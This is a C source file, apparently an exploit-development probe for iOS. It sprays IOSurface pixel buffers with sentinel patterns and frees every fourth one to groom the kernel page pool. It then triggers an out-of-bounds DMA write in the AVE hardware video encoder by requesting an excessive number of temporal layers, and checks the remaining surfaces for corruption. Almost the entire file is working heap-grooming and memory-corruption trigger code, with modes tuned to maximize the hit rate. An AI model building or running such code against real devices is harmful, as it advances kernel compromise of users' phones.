/*
 * ave_pixeldata_probe.c — IOSurface Pixel Data Heap Adjacency Probe
 *
 * CRITICAL FIX: Previous probes checked IOSurface PROPERTIES (kalloc
 * type-isolated zones) and pipe buffers (KHEAP_DATA_BUFFERS). Both are
 * in separate heaps from the DMA output buffer, so 0 corruption was
 * expected and correct — they can NEVER be adjacent.
 *
 * This probe checks IOSurface PIXEL DATA instead. IOSurface pixel
 * backing memory uses kmem_alloc from the kernel page pool — the SAME
 * allocator that provides AVE DMA output buffers. These allocations
 * CAN be physically adjacent.
 *
 * Detection method:
 *   1. Create many IOSurfaces with known pixel data patterns
 *   2. Lock each surface, fill pixel buffer with sentinel pattern
 *   3. Free every Nth surface to create holes
 *   4. Trigger AVE encode with NTL=9+ (DMA OOB write)
 *   5. Re-lock remaining surfaces and check pixel data for corruption
 *   6. DMA overflow writes pixel fill bytes into adjacent pages
 *
 * Target: iPhone Duo (A20 Pro), iOS 27.1
 *
 * Build:
 *   xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
 *     -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
 *     -framework CoreFoundation -framework IOSurface -framework IOKit \
 *     -o ave_pixeldata_probe ave_pixeldata_probe.c -Wno-deprecated-declarations
 *
 * Deployed as: AVEPixel.app (com.research.avepixel)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <signal.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef surface);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef surface);
extern void *IOSurfaceGetBaseAddress(IOSurfaceRef surface);
extern size_t IOSurfaceGetBytesPerRow(IOSurfaceRef surface);
extern size_t IOSurfaceGetHeight(IOSurfaceRef surface);
extern size_t IOSurfaceGetWidth(IOSurfaceRef surface);
extern kern_return_t IOSurfaceLock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);
extern kern_return_t IOSurfaceUnlock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);

static FILE *out;
static volatile int g_signal = 0;
static void sig_handler(int sig) { g_signal = sig; }

static void p(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt); vfprintf(out, fmt, ap); va_end(ap); fflush(out);
}

/*
 * Spray parameters tuned for page-level adjacency:
 * - 16KB surfaces on 16KB-page devices (A17+), 1 page each
 * - 64KB surfaces on 16KB-page devices = 4 pages each (more coverage)
 * - Stride of 4 means 25% free for DMA buffer landing
 */
#define SPRAY_COUNT    256
#define HOLE_STRIDE    4
#define SURFACE_W      128
#define SURFACE_H      128
#define SURFACE_BPR    512
#define SURFACE_ALLOC  (SURFACE_H * SURFACE_BPR)  /* 65536 = 64KB = 4 pages on 16KB */
#define SENTINEL_BYTE  0xAB

static IOSurfaceRef g_surfaces[SPRAY_COUNT];

static IOSurfaceRef create_pixel_surface(int idx) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int w = SURFACE_W, h = SURFACE_H, bpr = SURFACE_BPR;
    int alloc = SURFACE_ALLOC;
    int fmt = 0x42475241; /* BGRA */
    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
    CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
    CFNumberRef nbpr = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpr);
    CFNumberRef nalloc = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &alloc);
    CFNumberRef nfmt = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &fmt);
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nbpr);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nalloc);
    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nfmt);

    IOSurfaceRef surf = IOSurfaceCreate(props);
    CFRelease(nw); CFRelease(nh); CFRelease(nbpr); CFRelease(nalloc);
    CFRelease(nfmt); CFRelease(props);

    if (surf) {
        kern_return_t kr = IOSurfaceLock(surf, 0, NULL);
        if (kr == KERN_SUCCESS) {
            void *base = IOSurfaceGetBaseAddress(surf);
            if (base) {
                /*
                 * Fill with per-surface sentinel pattern:
                 * First 8 bytes: 0xDEAD0000 | idx (marker)
                 * Rest: repeating idx-derived byte
                 */
                uint8_t fill = SENTINEL_BYTE ^ (idx & 0xFF);
                memset(base, fill, SURFACE_ALLOC);
                /* Write structured header at start of pixel data */
                uint32_t *hdr = (uint32_t *)base;
                hdr[0] = 0xDEAD0000 | (idx & 0xFFFF);
                hdr[1] = 0xBEEF0000 | (idx & 0xFFFF);
                /* Write sentinel at every 4KB boundary (page edges) */
                for (int pg = 0; pg < SURFACE_ALLOC; pg += 4096) {
                    uint32_t *mark = (uint32_t *)((uint8_t *)base + pg);
                    if (pg > 0) {
                        mark[0] = 0xCAFE0000 | (idx & 0xFFFF);
                        mark[1] = pg;
                    }
                }
            }
            IOSurfaceUnlock(surf, 0, NULL);
        }
    }
    return surf;
}

/*
 * Check pixel data for corruption.
 * Returns: 0=intact, 1=corrupted, -1=error
 * On corruption, logs the offset and corrupted bytes.
 */
static int check_pixel_data(IOSurfaceRef surf, int idx) {
    kern_return_t kr = IOSurfaceLock(surf, 1 /* kIOSurfaceLockReadOnly */, NULL);
    if (kr != KERN_SUCCESS) return -1;

    void *base = IOSurfaceGetBaseAddress(surf);
    if (!base) { IOSurfaceUnlock(surf, 1, NULL); return -1; }

    int corrupted = 0;
    uint8_t fill = SENTINEL_BYTE ^ (idx & 0xFF);

    /* Check structured header */
    uint32_t *hdr = (uint32_t *)base;
    uint32_t exp0 = 0xDEAD0000 | (idx & 0xFFFF);
    uint32_t exp1 = 0xBEEF0000 | (idx & 0xFFFF);
    if (hdr[0] != exp0 || hdr[1] != exp1) {
        p("  !! PIXEL CORRUPTION surf[%d] header: "
          "expected 0x%08x/0x%08x got 0x%08x/0x%08x\n",
          idx, exp0, exp1, hdr[0], hdr[1]);
        corrupted = 1;
    }

    /* Check page-boundary sentinels */
    for (int pg = 4096; pg < SURFACE_ALLOC; pg += 4096) {
        uint32_t *mark = (uint32_t *)((uint8_t *)base + pg);
        uint32_t exp_cafe = 0xCAFE0000 | (idx & 0xFFFF);
        if (mark[0] != exp_cafe) {
            p("  !! PIXEL CORRUPTION surf[%d] page@%d: "
              "expected 0x%08x got 0x%08x\n",
              idx, pg, exp_cafe, mark[0]);
            corrupted = 1;
        }
    }

    /* Scan entire buffer for any non-sentinel bytes (sample every 256 bytes) */
    uint8_t *buf = (uint8_t *)base;
    int sample_corruptions = 0;
    for (int off = 64; off < SURFACE_ALLOC; off += 256) {
        /* Skip page-boundary sentinel zones (first 8 bytes of each page) */
        int page_off = off % 4096;
        if (page_off < 8) continue;
        if (buf[off] != fill) {
            if (sample_corruptions < 8) {
                p("  !! PIXEL CORRUPTION surf[%d] @0x%x: "
                  "expected 0x%02x got 0x%02x\n",
                  idx, off, fill, buf[off]);
            }
            sample_corruptions++;
            corrupted = 1;
        }
    }
    if (sample_corruptions > 8)
        p("  !! ... and %d more sample corruptions\n", sample_corruptions - 8);

    IOSurfaceUnlock(surf, 1, NULL);
    return corrupted;
}

static void encode_cb(void *ref, void *buf, OSStatus st,
                       VTEncodeInfoFlags flags, CMSampleBufferRef sb) {
    (*(int *)ref)++;
}

static int do_encode(int ntl, int frames, uint8_t pixel_fill) {
    p("  Encoding: NTL=%d frames=%d fill=0x%02x\n", ntl, frames, pixel_fill);
    CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iop = CFDictionaryCreate(
        kCFAllocatorDefault, NULL, NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
    CFRelease(iop);
    int pixfmt = kCVPixelFormatType_32BGRA;
    CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
    CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn); CFRelease(fn);

    int cb = 0;
    VTCompressionSessionRef sess = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
        NULL, sa, NULL, encode_cb, &cb, &sess);
    CFRelease(sa);
    if (st || !sess) { p("  VTCreate failed: %d\n", (int)st); return -1; }

    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
    CFNumberRef n; int v;
    v = 1; n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
    VTSessionSetProperty(sess, CFSTR("EncoderUsage"), n); CFRelease(n);
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
    VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), n); CFRelease(n);

    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    if (st) { VTCompressionSessionInvalidate(sess); CFRelease(sess); return -1; }

    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(sess);
    if (!pool) { VTCompressionSessionInvalidate(sess); CFRelease(sess); return -2; }

    for (int i = 0; i < frames; i++) {
        if (g_signal) break;
        CVPixelBufferRef pb = NULL;
        CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
        if (!pb) break;
        CVPixelBufferLockBaseAddress(pb, 0);
        void *base = CVPixelBufferGetBaseAddress(pb);
        if (base) memset(base, pixel_fill, CVPixelBufferGetDataSize(pb));
        CVPixelBufferUnlockBaseAddress(pb, 0);
        st = VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(i,30), CMTimeMake(1,30), NULL, NULL, NULL);
        CVPixelBufferRelease(pb);
        if (st) break;
    }
    VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid);
    p("  Callbacks: %d\n", cb);
    VTCompressionSessionInvalidate(sess); CFRelease(sess);
    return cb;
}

int main(int argc, char *argv[]) {
    signal(SIGBUS, sig_handler);
    signal(SIGSEGV, sig_handler);
    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    const char *mode = (argc >= 2) ? argv[1] : "info";
    snprintf(path, sizeof(path), "%s/Documents/ave_pixeldata_%s.txt", home, mode);
    out = fopen(path, "w");
    if (!out) return 1;

    p("=== AVE Pixel Data Heap Adjacency Probe ===\n");
    p("Mode: %s\nPID: %d\n", mode, getpid());
    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    p("Build: %s\n", buf);
    len = sizeof(buf); sysctlbyname("hw.machine", buf, &len, NULL, 0);
    p("Machine: %s\n", buf);
    int pagesize = getpagesize();
    p("Page size: %d\n", pagesize);
    p("Surface alloc: %d bytes (%d pages)\n", SURFACE_ALLOC, SURFACE_ALLOC / pagesize);
    p("Spray count: %d, hole stride: %d\n\n", SPRAY_COUNT, HOLE_STRIDE);

    p("WHY THIS PROBE:\n");
    p("  Previous probes checked IOSurface PROPERTIES and pipe buffers.\n");
    p("  Properties -> kalloc type-isolated zones (NEVER adjacent to DMA)\n");
    p("  Pipe bufs  -> KHEAP_DATA_BUFFERS (NEVER adjacent to DMA)\n");
    p("  Pixel data -> kmem_alloc page pool (SAME pool as DMA output)\n");
    p("  This probe checks pixel data = correct heap for adjacency.\n\n");

    if (strcmp(mode, "info") == 0) {
        p("Modes:\n");
        p("  baseline     - Spray+check pixel data (no encode, verify setup)\n");
        p("  pixel_ntl9   - Spray + encode NTL=9 (1 extra temporal layer)\n");
        p("  pixel_ntl16  - Spray + encode NTL=16 (8 extra layers)\n");
        p("  pixel_ntl32  - Spray + encode NTL=32 (24 extra layers)\n");
        p("  multi_round  - 10 rounds of spray+NTL=9 (maximize hit rate)\n");
        p("  scan_all     - Spray + NTL=9, full byte-by-byte scan\n");

    } else if (strcmp(mode, "baseline") == 0) {
        p("=== Baseline: Spray + Check (No Encode) ===\n");
        for (int i = 0; i < SPRAY_COUNT; i++) g_surfaces[i] = create_pixel_surface(i);
        int created = 0;
        for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) created++;
        p("  Created: %d surfaces (%.1f MB total pixel data)\n",
          created, (double)created * SURFACE_ALLOC / (1024*1024));
        for (int i = 0; i < SPRAY_COUNT && g_surfaces[i]; i += 64)
            p("  surf[%d] id=%u alloc=%zu\n", i,
              IOSurfaceGetID(g_surfaces[i]), IOSurfaceGetAllocSize(g_surfaces[i]));

        int ok = 0, bad = 0, err = 0;
        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (!g_surfaces[i]) continue;
            int r = check_pixel_data(g_surfaces[i], i);
            if (r == 0) ok++;
            else if (r == 1) bad++;
            else err++;
        }
        p("  Baseline: %d intact, %d corrupted, %d errors\n", ok, bad, err);
        if (bad > 0) p("  WARNING: Corruption at baseline — sentinel bug!\n");
        else p("  Baseline clean — sentinels verified.\n");
        for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) CFRelease(g_surfaces[i]);

    } else if (strncmp(mode, "pixel_ntl", 9) == 0) {
        int ntl = atoi(mode + 9);
        if (ntl < 2) ntl = 9;
        p("=== Pixel Data Probe: NTL=%d ===\n", ntl);

        p("Phase 1: Spray %d IOSurfaces with sentinel pixel data\n", SPRAY_COUNT);
        for (int i = 0; i < SPRAY_COUNT; i++) g_surfaces[i] = create_pixel_surface(i);
        int created = 0;
        for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) created++;
        p("  Created: %d (%.1f MB)\n", created,
          (double)created * SURFACE_ALLOC / (1024*1024));

        p("Phase 2: Free every %dth surface (create holes for DMA buffer)\n", HOLE_STRIDE);
        int freed = 0;
        for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE) {
            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; freed++; }
        }
        p("  Freed: %d surfaces (%d KB returned to page pool)\n",
          freed, freed * SURFACE_ALLOC / 1024);

        p("Phase 3: Encode with NTL=%d (DMA OOB into page pool)\n", ntl);
        /*
         * Use 0xBB as pixel fill — distinct from any sentinel byte.
         * If we see 0xBB in pixel data of surviving surfaces,
         * that's DMA overflow from the encode frame data.
         */
        do_encode(ntl, 5, 0xBB);
        usleep(200000);

        p("Phase 4: Check pixel data for DMA corruption\n");
        int ok = 0, bad = 0, miss = 0, err = 0;
        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (!g_surfaces[i]) { miss++; continue; }
            int r = check_pixel_data(g_surfaces[i], i);
            if (r == 0) ok++;
            else if (r == 1) bad++;
            else err++;
        }
        p("\n  RESULTS: %d intact, %d CORRUPTED, %d freed, %d errors\n",
          ok, bad, miss, err);
        if (bad > 0) {
            p("\n*** DMA HEAP CORRUPTION DETECTED IN PIXEL DATA ***\n");
            p("*** IOSurface pixel pages ARE adjacent to DMA output ***\n");
        } else {
            p("  No corruption. Possible reasons:\n");
            p("  - NTL=%d overflow too small to reach adjacent page\n", ntl);
            p("  - DMA buffer didn't land in a hole (try multi_round)\n");
            p("  - Page randomization prevented adjacency (try more spray)\n");
        }
        for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) CFRelease(g_surfaces[i]);

    } else if (strcmp(mode, "multi_round") == 0) {
        p("=== Multi-Round Pixel Data Probe (10 rounds, NTL=9) ===\n");
        int total_bad = 0;
        for (int round = 0; round < 10; round++) {
            if (g_signal) break;
            p("\n--- Round %d ---\n", round);
            for (int i = 0; i < SPRAY_COUNT; i++) g_surfaces[i] = create_pixel_surface(i);
            for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE)
                if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
            do_encode(9, 3, 0xCC + round);
            usleep(100000);
            int ok = 0, bad = 0;
            for (int i = 0; i < SPRAY_COUNT; i++) {
                if (!g_surfaces[i]) continue;
                int r = check_pixel_data(g_surfaces[i], i);
                if (r == 0) ok++;
                else if (r == 1) bad++;
            }
            p("  Round %d: %d intact, %d corrupted\n", round, ok, bad);
            total_bad += bad;
            for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) CFRelease(g_surfaces[i]);
            usleep(500000);
        }
        p("\n=== Total corruptions across 10 rounds: %d ===\n", total_bad);
        if (total_bad > 0) {
            p("*** DMA OOB PIXEL DATA CORRUPTION CONFIRMED ***\n");
            p("*** Heap adjacency achieved via page pool ***\n");
        }

    } else if (strcmp(mode, "scan_all") == 0) {
        p("=== Full Byte Scan: NTL=9 ===\n");
        for (int i = 0; i < SPRAY_COUNT; i++) g_surfaces[i] = create_pixel_surface(i);
        for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE)
            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
        do_encode(9, 5, 0xBB);
        usleep(200000);

        int total_corrupted_bytes = 0;
        int corrupted_surfaces = 0;
        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (!g_surfaces[i]) continue;
            kern_return_t kr = IOSurfaceLock(g_surfaces[i], 1, NULL);
            if (kr != KERN_SUCCESS) continue;
            void *base = IOSurfaceGetBaseAddress(g_surfaces[i]);
            if (!base) { IOSurfaceUnlock(g_surfaces[i], 1, NULL); continue; }

            uint8_t fill = SENTINEL_BYTE ^ (i & 0xFF);
            int this_corrupted = 0;
            uint8_t *b = (uint8_t *)base;
            /* Check the last 1024 bytes and first 1024 bytes (overflow boundaries) */
            for (int off = SURFACE_ALLOC - 1024; off < SURFACE_ALLOC; off++) {
                if (b[off] != fill) {
                    if (this_corrupted < 4)
                        p("  surf[%d] tail @0x%x: 0x%02x (expected 0x%02x)\n",
                          i, off, b[off], fill);
                    this_corrupted++;
                }
            }
            for (int off = 0; off < 1024; off++) {
                /* Skip header sentinel zone */
                if (off < 8) continue;
                if (b[off] != fill) {
                    if (this_corrupted < 4)
                        p("  surf[%d] head @0x%x: 0x%02x (expected 0x%02x)\n",
                          i, off, b[off], fill);
                    this_corrupted++;
                }
            }
            IOSurfaceUnlock(g_surfaces[i], 1, NULL);
            if (this_corrupted > 0) {
                p("  surf[%d]: %d corrupted bytes\n", i, this_corrupted);
                total_corrupted_bytes += this_corrupted;
                corrupted_surfaces++;
            }
        }
        p("\n  SCAN: %d surfaces corrupted, %d total bytes\n",
          corrupted_surfaces, total_corrupted_bytes);
        for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) CFRelease(g_surfaces[i]);

    } else {
        p("Unknown mode: %s (run with no args for help)\n", mode);
    }

    if (g_signal) p("\nCaught signal %d\n", g_signal);
    p("\n=== Done ===\n");
    fclose(out);
    return 0;
}
